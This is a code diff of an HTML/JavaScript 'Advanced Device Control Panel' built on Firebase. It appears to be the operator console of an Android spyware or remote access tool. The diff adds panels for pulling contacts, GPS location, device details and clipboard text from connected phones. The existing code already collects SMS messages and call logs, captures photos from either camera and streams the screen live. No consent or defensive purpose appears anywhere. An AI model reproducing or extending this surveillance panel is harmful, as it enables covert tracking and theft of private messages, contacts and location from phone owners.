@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Advanced Device Control Panel with Camera</title>
+    <title>Advanced Device Control Panel with Full Features</title>
     
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
@@ -386,7 +386,7 @@
         .call-missed { background: #fee2e2; color: #991b1b; }
         .call-rejected { background: #fef3c7; color: #92400e; }
         .call-blocked { background: #f3f4f6; color: #374151; }
-        .call-voicemail { background: #ede9fe; color: #5b21b6; }
+        .call-unknown { background: #f3f4f6; color: #374151; }
 
         .no-data {
             text-align: center;
@@ -501,7 +501,7 @@
             gap: 15px;
         }
 
-        .sms-item {
+        .sms-item, .contact-item, .clipboard-item {
             background: white;
             padding: 12px 15px;
             border-radius: 10px;
@@ -510,8 +510,8 @@
             position: relative;
         }
 
-        .sms-address { font-weight: 700; color: var(--dark); margin-bottom: 5px; }
-        .sms-body { color: var(--gray); font-size: 0.9em; }
+        .sms-address, .contact-name { font-weight: 700; color: var(--dark); margin-bottom: 5px; }
+        .sms-body, .contact-number { color: var(--gray); font-size: 0.9em; }
         .sms-date { font-size: 0.75em; color: #9ca3af; margin-top: 5px; }
 
         .delete-all-btn {
@@ -597,7 +597,6 @@
             border: 1px solid #e5e7eb;
         }
 
-        /* Camera Gallery Styles */
         .photo-gallery {
             display: grid;
             grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
@@ -671,6 +670,77 @@
             color: white;
         }
 
+        .info-card {
+            background: white;
+            border-radius: 12px;
+            padding: 20px;
+            margin: 10px 0;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+        }
+
+        .info-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 10px;
+        }
+
+        .info-item {
+            padding: 10px;
+            background: var(--light);
+            border-radius: 8px;
+        }
+
+        .info-label {
+            font-size: 0.75em;
+            color: var(--gray);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .info-value {
+            font-weight: 700;
+            color: var(--dark);
+            font-size: 1em;
+            margin-top: 3px;
+        }
+
+        .location-map {
+            background: #e5e7eb;
+            border-radius: 12px;
+            height: 300px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 15px 0;
+        }
+
+        .location-coords {
+            display: flex;
+            gap: 20px;
+            justify-content: center;
+            flex-wrap: wrap;
+            margin: 15px 0;
+        }
+
+        .coord-box {
+            background: var(--light);
+            padding: 15px 25px;
+            border-radius: 12px;
+            text-align: center;
+        }
+
+        .coord-label {
+            font-size: 0.8em;
+            color: var(--gray);
+            margin-bottom: 5px;
+        }
+
+        .coord-value {
+            font-size: 1.3em;
+            font-weight: 700;
+            color: var(--primary);
+        }
+
         @media (max-width: 768px) {
             body { padding: 10px; }
             .header h1 { font-size: 1.8em; }
@@ -678,6 +748,7 @@
             .command-grid { grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); }
             .data-table { font-size: 0.8em; }
             .photo-gallery { grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); }
+            .info-grid { grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); }
         }
     </style>
 </head>
@@ -689,7 +760,7 @@
         <!-- Header -->
         <div class="header">
             <h1>📱 Advanced Device Control Panel</h1>
-            <p>Real-time Remote Management with Camera Capture & Live Screen Sharing</p>
+            <p>Real-time Remote Management with Full Feature Support</p>
             <div class="stats-bar">
                 <div class="stat-item">
                     <span class="stat-dot online"></span>
@@ -741,6 +812,10 @@
                 <button class="tab-btn" onclick="switchTab('camera')">📷 Camera</button>
                 <button class="tab-btn" onclick="switchTab('sms')">💬 SMS</button>
                 <button class="tab-btn" onclick="switchTab('calls')">📞 Call Log</button>
+                <button class="tab-btn" onclick="switchTab('contacts')">👥 Contacts</button>
+                <button class="tab-btn" onclick="switchTab('location')">📍 Location</button>
+                <button class="tab-btn" onclick="switchTab('deviceinfo')">ℹ️ Device Info</button>
+                <button class="tab-btn" onclick="switchTab('clipboard')">📋 Clipboard</button>
                 <button class="tab-btn" onclick="switchTab('commands')">🎮 Commands</button>
             </div>
 
@@ -760,7 +835,6 @@
                     </div>
                 </div>
                 
-                <!-- Stream Quality Selector -->
                 <div class="stream-quality-selector">
                     <label style="font-weight: 600; color: var(--dark);">Stream Quality:</label>
                     <select id="streamQuality" onchange="updateStreamQuality()">
@@ -807,7 +881,6 @@
                     </div>
                 </div>
 
-                <!-- Camera Quick Capture Buttons -->
                 <div class="camera-selector">
                     <button class="camera-btn active" onclick="quickCapture('back')">
                         <i class="fas fa-camera"></i> Rear Camera
@@ -835,7 +908,6 @@
                     </div>
                 </div>
 
-                <!-- Photo Gallery -->
                 <div class="section-title">
                     <div class="section-title-left">
                         <span>🖼️</span> Photo Gallery
@@ -846,7 +918,6 @@
                     <div class="no-data" style="grid-column: 1/-1;">
                         <i class="fas fa-camera-retro"></i>
                         <p>No photos captured yet</p>
-                        <p style="font-size: 0.8em;">Use the camera buttons above to capture photos</p>
                     </div>
                 </div>
             </div>
@@ -887,15 +958,86 @@
                 </div>
             </div>
 
+            <!-- Contacts Tab -->
+            <div class="tab-content" id="tab-contacts">
+                <div class="section-title">
+                    <div class="section-title-left">
+                        <span>👥</span> Contacts
+                    </div>
+                    <button class="delete-all-btn" onclick="clearContacts()">
+                        <i class="fas fa-trash"></i> Clear Contacts
+                    </button>
+                </div>
+                <div id="contactsContainer">
+                    <div class="no-data">
+                        <i class="fas fa-address-book"></i>
+                        <p>Click Contacts button in Commands tab</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Location Tab -->
+            <div class="tab-content" id="tab-location">
+                <div class="section-title">
+                    <div class="section-title-left">
+                        <span>📍</span> GPS Location
+                    </div>
+                    <button class="delete-all-btn" onclick="clearLocation()">
+                        <i class="fas fa-trash"></i> Clear Location
+                    </button>
+                </div>
+                <div id="locationContainer">
+                    <div class="no-data">
+                        <i class="fas fa-map-marker-alt"></i>
+                        <p>Click GPS Location button in Commands tab</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Device Info Tab -->
+            <div class="tab-content" id="tab-deviceinfo">
+                <div class="section-title">
+                    <div class="section-title-left">
+                        <span>ℹ️</span> Device Information
+                    </div>
+                    <button class="delete-all-btn" onclick="clearDeviceInfo()">
+                        <i class="fas fa-trash"></i> Clear Info
+                    </button>
+                </div>
+                <div id="deviceInfoContainer">
+                    <div class="no-data">
+                        <i class="fas fa-info-circle"></i>
+                        <p>Click Device Info button in Commands tab</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Clipboard Tab -->
+            <div class="tab-content" id="tab-clipboard">
+                <div class="section-title">
+                    <div class="section-title-left">
+                        <span>📋</span> Clipboard Content
+                    </div>
+                    <button class="delete-all-btn" onclick="clearClipboard()">
+                        <i class="fas fa-trash"></i> Clear Clipboard
+                    </button>
+                </div>
+                <div id="clipboardContainer">
+                    <div class="no-data">
+                        <i class="fas fa-clipboard"></i>
+                        <p>Click Clipboard button in Commands tab</p>
+                    </div>
+                </div>
+            </div>
+
             <!-- Commands Tab -->
             <div class="tab-content" id="tab-commands">
                 <div class="section-title">
                     <div class="section-title-left">
-                        <span>🎮</span> Device Commands
+                        <span>🎮</span> All Commands
                     </div>
                 </div>
                 
-                <!-- Camera Section in Commands -->
                 <div class="section-title" style="margin-top: 5px;">
                     <div class="section-title-left">
                         <span>📷</span> Camera Controls
@@ -916,10 +1058,9 @@
                     </div>
                 </div>
 
-                <!-- Other Commands -->
                 <div class="section-title" style="margin-top: 5px;">
                     <div class="section-title-left">
-                        <span>🎯</span> All Commands
+                        <span>📺</span> Screen & Stream
                     </div>
                 </div>
                 <div class="command-grid">
@@ -935,10 +1076,14 @@
                         <div class="command-icon">⏹️</div>
                         <div class="command-label">Stop Stream</div>
                     </div>
-                    <div class="command-card" onclick="sendCommand('get_clipboard')">
-                        <div class="command-icon">📋</div>
-                        <div class="command-label">Clipboard</div>
+                </div>
+
+                <div class="section-title" style="margin-top: 5px;">
+                    <div class="section-title-left">
+                        <span>📊</span> Data Retrieval
                     </div>
+                </div>
+                <div class="command-grid">
                     <div class="command-card" onclick="sendCommand('get_sms')">
                         <div class="command-icon">💬</div>
                         <div class="command-label">Get SMS</div>
@@ -947,13 +1092,25 @@
                         <div class="command-icon">📞</div>
                         <div class="command-label">Call Log</div>
                     </div>
-                    <div class="command-card" onclick="sendCommand('get_location')">
-                        <div class="command-icon">📍</div>
-                        <div class="command-label">GPS Location</div>
-                    </div>
                     <div class="command-card" onclick="sendCommand('get_contacts')">
                         <div class="command-icon">👥</div>
                         <div class="command-label">Contacts</div>
+                    </div>
+                    <div class="command-card" onclick="sendCommand('get_clipboard')">
+                        <div class="command-icon">📋</div>
+                        <div class="command-label">Clipboard</div>
+                    </div>
+                </div>
+
+                <div class="section-title" style="margin-top: 5px;">
+                    <div class="section-title-left">
+                        <span>🔧</span> Device & Sensors
+                    </div>
+                </div>
+                <div class="command-grid">
+                    <div class="command-card" onclick="sendCommand('get_location')">
+                        <div class="command-icon">📍</div>
+                        <div class="command-label">GPS Location</div>
                     </div>
                     <div class="command-card" onclick="sendCommand('get_device_info')">
                         <div class="command-icon">ℹ️</div>
@@ -1012,13 +1169,10 @@
         let screenshotListener = null;
         let photosListener = null;
         
-        // Stream variables
         let streamActive = false;
         let streamFrameCount = 0;
-        let lastFrameTime = Date.now();
         let frameTimes = [];
         
-        // Camera photos array
         let capturedPhotos = [];
 
         const deviceGrid = document.getElementById('deviceGrid');
@@ -1029,6 +1183,10 @@
         const screenContainer = document.getElementById('screenContainer');
         const smsContainer = document.getElementById('smsContainer');
         const callLogContainer = document.getElementById('callLogContainer');
+        const contactsContainer = document.getElementById('contactsContainer');
+        const locationContainer = document.getElementById('locationContainer');
+        const deviceInfoContainer = document.getElementById('deviceInfoContainer');
+        const clipboardContainer = document.getElementById('clipboardContainer');
         const photoGallery = document.getElementById('photoGallery');
         const photoCount = document.getElementById('photoCount');
         const onlineCount = document.getElementById('onlineCount');
@@ -1076,7 +1234,7 @@
             const container = document.getElementById('toastContainer');
             const toast = document.createElement('div');
             toast.className = 'toast';
-            const icons = { success: '✅', error: '❌', warning: '⚠️', info: 'ℹ️', camera: '📷' };
+            const icons = { success: '✅', error: '❌', warning: '⚠️', info: 'ℹ️', camera: '📷', location: '📍', clipboard: '📋', contacts: '👥', device: 'ℹ️' };
             toast.innerHTML = `<span>${icons[type] || icons.info}</span> ${message}`;
             container.appendChild(toast);
             setTimeout(() => {
@@ -1103,9 +1261,7 @@
         // ============ CLEAR FUNCTIONS ============
         function clearScreen() {
             showModal('Clear Screen', 'Delete current screenshot/stream? This will stop any live stream.', () => {
-                if (streamActive) {
-                    stopLiveStream();
-                }
+                if (streamActive) stopLiveStream();
                 screenContainer.innerHTML = '<div class="no-data"><i class="fas fa-mobile-alt"></i><p>Screen cleared</p></div>';
                 if (connectedDeviceId) {
                     database.ref(`devices/${connectedDeviceId}/screenshots`).remove();
@@ -1132,8 +1288,40 @@
             });
         }
 
+        function clearContacts() {
+            showModal('Clear Contacts', 'Delete all contacts data?', () => {
+                contactsContainer.innerHTML = '<div class="no-data"><i class="fas fa-address-book"></i><p>Contacts cleared</p></div>';
+                addLog('🧹 Contacts cleared', 'info');
+                showToast('Contacts cleared', 'success');
+            });
+        }
+
+        function clearLocation() {
+            showModal('Clear Location', 'Clear location data?', () => {
+                locationContainer.innerHTML = '<div class="no-data"><i class="fas fa-map-marker-alt"></i><p>Location data cleared</p></div>';
+                addLog('🧹 Location cleared', 'info');
+                showToast('Location cleared', 'success');
+            });
+        }
+
+        function clearDeviceInfo() {
+            showModal('Clear Device Info', 'Clear device information?', () => {
+                deviceInfoContainer.innerHTML = '<div class="no-data"><i class="fas fa-info-circle"></i><p>Device info cleared</p></div>';
+                addLog('🧹 Device info cleared', 'info');
+                showToast('Device info cleared', 'success');
+            });
+        }
+
+        function clearClipboard() {
+            showModal('Clear Clipboard', 'Clear clipboard data?', () => {
+                clipboardContainer.innerHTML = '<div class="no-data"><i class="fas fa-clipboard"></i><p>Clipboard cleared</p></div>';
+                addLog('🧹 Clipboard cleared', 'info');
+                showToast('Clipboard cleared', 'success');
+            });
+        }
+
         function clearCameraPhotos() {
-            showModal('Clear Photos', 'Delete all captured photos? This cannot be undone.', () => {
+            showModal('Clear Photos', 'Delete all captured photos?', () => {
                 capturedPhotos = [];
                 renderPhotoGallery();
                 if (connectedDeviceId) {
@@ -1150,7 +1338,6 @@
             onlineCount.textContent = deviceList.filter(d => d.status === 'online').length;
             connectedCount.textContent = deviceList.filter(d => d.connectionStatus === 'connected').length;
             commandCountEl.textContent = commandCount;
-            
             if (streamActive) {
                 streamStatus.style.display = 'flex';
             } else {
@@ -1160,6 +1347,7 @@
 
         // ============ FORMATTING ============
         function formatDate(timestamp) {
+            if (!timestamp) return 'Unknown';
             return new Date(parseInt(timestamp)).toLocaleString();
         }
 
@@ -1179,33 +1367,309 @@
             const minutes = Math.floor(seconds / 60);
             const hours = Math.floor(minutes / 60);
             const days = Math.floor(hours / 24);
-            
             if (days > 0) return `${days}d ago`;
             if (hours > 0) return `${hours}h ago`;
             if (minutes > 0) return `${minutes}m ago`;
             return `${seconds}s ago`;
         }
 
+        function formatBytes(bytes) {
+            if (!bytes) return 'N/A';
+            const mb = bytes / (1024 * 1024);
+            return `${mb.toFixed(0)} MB`;
+        }
+
+        // ============ DISPLAY FUNCTIONS ============
+        function displayCallLog(calls, deviceName) {
+            if (!calls || calls.length === 0) {
+                callLogContainer.innerHTML = '<div class="no-data"><i class="fas fa-phone-slash"></i><p>No calls found</p></div>';
+                return;
+            }
+
+            let html = `<div style="margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center;">
+                <span style="font-weight: 700; color: var(--primary);">📱 ${deviceName} - ${calls.length} calls</span>
+                <button class="btn btn-delete" onclick="clearCallLog()"><i class="fas fa-trash"></i> Clear</button>
+            </div>`;
+            html += '<div class="data-table-container"><table class="data-table"><thead><tr>';
+            html += '<th>#</th><th>Name</th><th>Number</th><th>Type</th><th>Duration</th><th>Date</th>';
+            html += '</tr></thead><tbody>';
+
+            calls.forEach((call, index) => {
+                const typeLower = (call.type || 'unknown').toLowerCase();
+                const typeClass = ['incoming', 'outgoing', 'missed', 'rejected', 'blocked'].includes(typeLower) ? typeLower : 'unknown';
+                html += `<tr>
+                    <td>${index + 1}</td>
+                    <td><strong>${call.name || 'Unknown'}</strong></td>
+                    <td>${call.number || 'Unknown'}</td>
+                    <td><span class="call-type call-${typeClass}">${call.type || 'Unknown'}</span></td>
+                    <td>${formatDuration(call.duration)}</td>
+                    <td>${formatDate(call.date)}</td>
+                </tr>`;
+            });
+
+            html += '</tbody></table></div>';
+            callLogContainer.innerHTML = html;
+            switchTab('calls');
+            addLog(`📞 Call Log displayed: ${calls.length} calls from ${deviceName}`, 'success');
+            showToast(`Call log loaded: ${calls.length} calls`, 'success');
+        }
+
+        function displaySMS(messages, deviceName) {
+            if (!messages || messages.length === 0) {
+                smsContainer.innerHTML = '<div class="no-data"><i class="fas fa-envelope-open"></i><p>No SMS found</p></div>';
+                return;
+            }
+
+            let html = `<div style="margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center;">
+                <span style="font-weight: 700; color: var(--primary);">📱 ${deviceName} - ${messages.length} messages</span>
+                <button class="btn btn-delete" onclick="clearSMS()"><i class="fas fa-trash"></i> Clear</button>
+            </div>`;
+
+            messages.forEach(msg => {
+                html += `
+                <div class="sms-item">
+                    <div class="sms-address">📱 ${msg.address || 'Unknown'} <span style="font-size:0.75em;color:var(--gray);">(${msg.type || 'unknown'})</span></div>
+                    <div class="sms-body">${msg.body || '(empty)'}</div>
+                    <div class="sms-date">📅 ${formatDate(msg.date)}</div>
+                </div>`;
+            });
+
+            smsContainer.innerHTML = html;
+            switchTab('sms');
+            addLog(`💬 SMS displayed: ${messages.length} messages from ${deviceName}`, 'success');
+            showToast(`SMS loaded: ${messages.length} messages`, 'success');
+        }
+
+        function displayContacts(contacts, count, deviceName) {
+            if (!contacts || contacts.length === 0) {
+                contactsContainer.innerHTML = '<div class="no-data"><i class="fas fa-address-book"></i><p>No contacts found</p></div>';
+                return;
+            }
+
+            let html = `<div style="margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center;">
+                <span style="font-weight: 700; color: var(--primary);">👥 ${deviceName} - ${count || contacts.length} contacts</span>
+                <button class="btn btn-delete" onclick="clearContacts()"><i class="fas fa-trash"></i> Clear</button>
+            </div>`;
+            html += '<div class="data-table-container"><table class="data-table"><thead><tr>';
+            html += '<th>#</th><th>Name</th><th>Phone Number</th>';
+            html += '</tr></thead><tbody>';
+
+            contacts.forEach((contact, index) => {
+                html += `<tr>
+                    <td>${index + 1}</td>
+                    <td><strong>${contact.name || 'Unknown'}</strong></td>
+                    <td>${contact.number || 'N/A'}</td>
+                </tr>`;
+            });
+
+            html += '</tbody></table></div>';
+            contactsContainer.innerHTML = html;
+            switchTab('contacts');
+            addLog(`👥 Contacts displayed: ${contacts.length} contacts from ${deviceName}`, 'success');
+            showToast(`Contacts loaded: ${contacts.length} contacts`, 'success');
+        }
+
+        function displayLocation(data, deviceName) {
+            if (!data) {
+                locationContainer.innerHTML = '<div class="no-data"><i class="fas fa-map-marker-alt"></i><p>No location data</p></div>';
+                return;
+            }
+
+            if (data.error) {
+                locationContainer.innerHTML = `
+                    <div class="info-card">
+                        <div style="display: flex; align-items: center; gap: 15px; margin-bottom: 15px;">
+                            <span style="font-size: 2em;">📍</span>
+                            <div>
+                                <strong style="color: var(--danger);">Location Unavailable</strong>
+                                <p style="color: var(--gray); font-size: 0.9em;">${data.error}</p>
+                                ${data.provider ? `<p style="color: var(--gray); font-size: 0.8em;">Provider: ${data.provider}</p>` : ''}
+                            </div>
+                        </div>
+                        <button class="btn btn-delete" onclick="clearLocation()"><i class="fas fa-trash"></i> Clear</button>
+                    </div>`;
+            } else {
+                const lat = data.latitude;
+                const lng = data.longitude;
+                const mapsUrl = `https://www.google.com/maps?q=${lat},${lng}`;
+                const staticMapUrl = `https://maps.googleapis.com/maps/api/staticmap?center=${lat},${lng}&zoom=15&size=600x300&markers=color:red|${lat},${lng}&key=YOUR_API_KEY`;
+                
+                locationContainer.innerHTML = `
+                    <div class="info-card">
+                        <div style="display: flex; align-items: center; gap: 15px; margin-bottom: 15px;">
+                            <span style="font-size: 2em;">📍</span>
+                            <div>
+                                <strong>${deviceName} Location</strong>
+                                <p style="color: var(--gray); font-size: 0.9em;">Provider: ${data.provider || 'Unknown'} | Accuracy: ${data.accuracy ? data.accuracy.toFixed(1) + 'm' : 'N/A'}</p>
+                                ${data.time ? `<p style="color: var(--gray); font-size: 0.8em;">Time: ${formatDate(data.time)}</p>` : ''}
+                            </div>
+                        </div>
+                        
+                        <div class="location-coords">
+                            <div class="coord-box">
+                                <div class="coord-label">Latitude</div>
+                                <div class="coord-value">${lat.toFixed(6)}</div>
+                            </div>
+                            <div class="coord-box">
+                                <div class="coord-label">Longitude</div>
+                                <div class="coord-value">${lng.toFixed(6)}</div>
+                            </div>
+                            ${data.altitude ? `
+                            <div class="coord-box">
+                                <div class="coord-label">Altitude</div>
+                                <div class="coord-value">${data.altitude.toFixed(1)}m</div>
+                            </div>` : ''}
+                            ${data.speed ? `
+                            <div class="coord-box">
+                                <div class="coord-label">Speed</div>
+                                <div class="coord-value">${(data.speed * 3.6).toFixed(1)} km/h</div>
+                            </div>` : ''}
+                        </div>
+
+                        <div style="display: flex; gap: 10px; justify-content: center; margin-top: 15px; flex-wrap: wrap;">
+                            <a href="${mapsUrl}" target="_blank" class="btn btn-connect">
+                                <i class="fas fa-map-marker-alt"></i> Open in Google Maps
+                            </a>
+                            <button class="btn btn-delete" onclick="clearLocation()">
+                                <i class="fas fa-trash"></i> Clear
+                            </button>
+                        </div>
+                    </div>`;
+            }
+            
+            switchTab('location');
+            addLog(`📍 Location displayed for ${deviceName}`, 'success');
+            showToast('Location data received!', 'location');
+        }
+
+        function displayDeviceInfo(data, deviceName) {
+            if (!data) {
+                deviceInfoContainer.innerHTML = '<div class="no-data"><i class="fas fa-info-circle"></i><p>No device info</p></div>';
+                return;
+            }
+
+            let html = `<div style="margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center;">
+                <span style="font-weight: 700; color: var(--primary);">ℹ️ ${deviceName || data.model || 'Device'} Information</span>
+                <button class="btn btn-delete" onclick="clearDeviceInfo()"><i class="fas fa-trash"></i> Clear</button>
+            </div>`;
+
+            html += '<div class="info-grid">';
+            
+            const fields = [
+                { key: 'manufacturer', label: 'Manufacturer', icon: '🏭' },
+                { key: 'brand', label: 'Brand', icon: '🏷️' },
+                { key: 'model', label: 'Model', icon: '📱' },
+                { key: 'device', label: 'Device', icon: '🔧' },
+                { key: 'product', label: 'Product', icon: '📦' },
+                { key: 'androidVersion', label: 'Android Version', icon: '🤖' },
+                { key: 'sdkVersion', label: 'SDK Version', icon: '📊' },
+                { key: 'board', label: 'Board', icon: '🖥️' },
+                { key: 'hardware', label: 'Hardware', icon: '⚙️' },
+                { key: 'screenWidth', label: 'Screen Width', icon: '↔️' },
+                { key: 'screenHeight', label: 'Screen Height', icon: '↕️' },
+                { key: 'screenDensity', label: 'Screen Density', icon: '📐' },
+                { key: 'batteryLevel', label: 'Battery Level', icon: '🔋' },
+                { key: 'totalRam', label: 'Total RAM', icon: '💾' },
+                { key: 'availableRam', label: 'Available RAM', icon: '💿' }
+            ];
+
+            fields.forEach(field => {
+                if (data[field.key] !== undefined && data[field.key] !== null) {
+                    let value = data[field.key];
+                    if (field.key === 'screenDensity') value = `${value} dpi`;
+                    if (field.key === 'totalRam' || field.key === 'availableRam') value = `${value} MB`;
+                    if (field.key === 'batteryLevel') value = `${value}%`;
+                    if (field.key === 'screenWidth' || field.key === 'screenHeight') value = `${value} px`;
+
+                    html += `
+                    <div class="info-item">
+                        <div class="info-label">${field.icon} ${field.label}</div>
+                        <div class="info-value">${value}</div>
+                    </div>`;
+                }
+            });
+
+            html += '</div>';
+            deviceInfoContainer.innerHTML = html;
+            switchTab('deviceinfo');
+            addLog(`ℹ️ Device info displayed: ${data.manufacturer || ''} ${data.model || ''}`, 'success');
+            showToast('Device info received!', 'device');
+        }
+
+        function displayClipboard(text, isEmpty, deviceName) {
+            if (isEmpty || !text) {
+                clipboardContainer.innerHTML = `
+                    <div class="info-card">
+                        <div style="display: flex; align-items: center; gap: 15px; margin-bottom: 15px;">
+                            <span style="font-size: 2em;">📋</span>
+                            <div>
+                                <strong>Clipboard is Empty</strong>
+                                <p style="color: var(--gray); font-size: 0.9em;">No text in ${deviceName}'s clipboard</p>
+                            </div>
+                        </div>
+                        <button class="btn btn-delete" onclick="clearClipboard()"><i class="fas fa-trash"></i> Clear</button>
+                    </div>`;
+            } else {
+                clipboardContainer.innerHTML = `
+                    <div class="info-card">
+                        <div style="display: flex; align-items: center; gap: 15px; margin-bottom: 15px;">
+                            <span style="font-size: 2em;">📋</span>
+                            <div>
+                                <strong>${deviceName} Clipboard</strong>
+                                <p style="color: var(--gray); font-size: 0.9em;">${text.length} characters</p>
+                            </div>
+                        </div>
+                        <div class="clipboard-item" style="background: var(--light); padding: 20px; border-radius: 12px; word-break: break-all;">
+                            <p style="color: var(--dark); font-size: 1em; line-height: 1.6; white-space: pre-wrap;">${text}</p>
+                        </div>
+                        <div style="display: flex; gap: 10px; justify-content: center; margin-top: 15px;">
+                            <button class="btn btn-connect" onclick="copyToClipboard('${text.replace(/'/g, "\\'").replace(/"/g, '&quot;')}')">
+                                <i class="fas fa-copy"></i> Copy to My Clipboard
+                            </button>
+                            <button class="btn btn-delete" onclick="clearClipboard()">
+                                <i class="fas fa-trash"></i> Clear
+                            </button>
+                        </div>
+                    </div>`;
+            }
+            
+            switchTab('clipboard');
+            addLog(`📋 Clipboard data received from ${deviceName}`, 'success');
+            showToast('Clipboard data received!', 'clipboard');
+        }
+
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text).then(() => {
+                showToast('Copied to your clipboard!', 'success');
+                addLog('📋 Text copied to local clipboard', 'success');
+            }).catch(() => {
+                showToast('Failed to copy', 'error');
+            });
+        }
+
+        function displayScreenshot(imageUrl, deviceName, width, height, cameraType) {
+            const badge = cameraType ? `<span style="background: rgba(102,126,234,0.9); color: white; padding: 3px 10px; border-radius: 12px; font-size: 0.8em; margin-left: 8px;">${cameraType === 'front' ? '🤳 Front' : '📷 Rear'} Camera</span>` : '';
+            
+            screenContainer.innerHTML = `
+                <div class="screen-info">📱 ${deviceName} ${badge} | ${width}x${height} | ${new Date().toLocaleTimeString()}</div>
+                <button class="screen-delete-btn" onclick="clearScreen()">
+                    <i class="fas fa-times"></i> Delete
+                </button>
+                <img src="${imageUrl}" style="max-width: 100%; max-height: 600px; border-radius: 8px;" alt="Screenshot from ${deviceName}">
+            `;
+            switchTab('screen');
+            addLog(`📸 Screenshot from ${deviceName} (${width}x${height})`, 'success');
+            showToast(`Screenshot received from ${deviceName}`, 'success');
+        }
+
         // ============ CAMERA FUNCTIONS ============
         function quickCapture(cameraType) {
             if (!connectedDeviceId) {
                 showToast('Connect to a device first!', 'warning');
-                addLog('⚠️ No device connected', 'warning');
                 return;
             }
-
-            // Update active button
             document.querySelectorAll('.camera-btn').forEach(btn => btn.classList.remove('active'));
             event.target.closest('.camera-btn').classList.add('active');
-
-            if (cameraType === 'both') {
-                showToast('Capturing from both cameras...', 'camera');
-                addLog('📸 Capturing from both cameras', 'info');
-            } else {
-                showToast(`Capturing from ${cameraType} camera...`, 'camera');
-                addLog(`📷 Capturing from ${cameraType} camera`, 'info');
-            }
-
             sendCommand('take_photo', { camera: cameraType });
         }
 
@@ -1215,7 +1679,6 @@
                     <div class="no-data" style="grid-column: 1/-1;">
                         <i class="fas fa-camera-retro"></i>
                         <p>No photos captured yet</p>
-                        <p style="font-size: 0.8em;">Use the camera buttons above to capture photos</p>
                     </div>`;
                 photoCount.textContent = '0 photos';
                 return;
@@ -1224,7 +1687,7 @@
             photoCount.textContent = `${capturedPhotos.length} photo${capturedPhotos.length > 1 ? 's' : ''}`;
             
             let html = '';
-            capturedPhotos.slice().reverse().forEach((photo, index) => {
+            capturedPhotos.slice().reverse().forEach((photo) => {
                 const cameraIcon = photo.camera === 'front' ? '🤳' : '📷';
                 const cameraLabel = photo.camera === 'front' ? 'Front' : 'Rear';
                 html += `
@@ -1234,7 +1697,6 @@
                     <div class="photo-info">
                         <div><strong>${photo.width}x${photo.height}</strong></div>
                         <div>${timeAgo(photo.timestamp)}</div>
-                        <div style="font-size: 0.7em; color: #9ca3af;">${formatDate(photo.timestamp)}</div>
                     </div>
                 </div>`;
             });
@@ -1269,13 +1731,12 @@
             link.click();
             document.body.removeChild(link);
             showToast('Photo download started', 'success');
-            addLog('📥 Photo downloaded', 'success');
         }
 
         // ============ STREAM FUNCTIONS ============
         function updateStreamQuality() {
             const quality = document.getElementById('streamQuality').value;
-            addLog(`🎚️ Stream quality set to: ${quality}%`, 'info');
+            addLog(`🎚️ Stream quality: ${quality}%`, 'info');
             showToast(`Stream quality: ${quality}%`, 'info');
         }
 
@@ -1284,40 +1745,29 @@
             frameTimes.push(now);
             frameTimes = frameTimes.filter(time => now - time < 2000);
             if (frameTimes.length < 2) return '...';
-            const fps = Math.round((frameTimes.length / 2) * 10) / 10;
-            return fps;
+            return Math.round((frameTimes.length / 2) * 10) / 10;
         }
 
         function startLiveStream() {
             if (!connectedDeviceId) {
                 showToast('Connect to a device first!', 'warning');
-                addLog('⚠️ No device connected', 'warning');
                 return;
             }
-
             if (streamActive) {
                 showToast('Stream is already active!', 'warning');
-                addLog('⚠️ Stream already running', 'warning');
                 return;
             }
-
             showToast('Starting live stream...', 'info');
             addLog('📹 Requesting live stream...', 'info');
-            
             sendCommand('start_streaming', { quality: document.getElementById('streamQuality').value || 50 });
         }
 
         function stopLiveStream() {
             if (!connectedDeviceId) return;
-
             if (!streamActive) {
                 showToast('No active stream to stop', 'warning');
                 return;
             }
-
-            showToast('Stopping stream...', 'info');
-            addLog('⏹️ Stopping live stream...', 'info');
-            
             sendCommand('stop_streaming', {});
             cleanupStream();
         }
@@ -1326,96 +1776,13 @@
             streamActive = false;
             streamFrameCount = 0;
             frameTimes = [];
-            
             if (streamListener) {
                 database.ref(`devices/${connectedDeviceId}/screenStream`).off('value', streamListener);
                 streamListener = null;
             }
-            
             streamingBadge.style.display = 'none';
             streamStatus.style.display = 'none';
-            
-            screenContainer.innerHTML = `
-                <div class="no-data">
-                    <i class="fas fa-stop-circle"></i>
-                    <p>Stream stopped</p>
-                </div>
-            `;
-        }
-
-        // ============ DISPLAY FUNCTIONS ============
-        function displayCallLog(calls, deviceName) {
-            if (!calls || calls.length === 0) {
-                callLogContainer.innerHTML = '<div class="no-data"><i class="fas fa-phone-slash"></i><p>No calls found</p></div>';
-                return;
-            }
-
-            let html = `<div style="margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center;">
-                <span style="font-weight: 700; color: var(--primary);">📱 ${deviceName} - ${calls.length} calls</span>
-                <button class="btn btn-delete" onclick="clearCallLog()"><i class="fas fa-trash"></i> Clear</button>
-            </div>`;
-            html += '<div class="data-table-container"><table class="data-table"><thead><tr>';
-            html += '<th>#</th><th>Name</th><th>Number</th><th>Type</th><th>Duration</th><th>Date</th>';
-            html += '</tr></thead><tbody>';
-
-            calls.forEach((call, index) => {
-                const typeClass = call.type.toLowerCase();
-                html += `<tr>
-                    <td>${index + 1}</td>
-                    <td><strong>${call.name || 'Unknown'}</strong></td>
-                    <td>${call.number}</td>
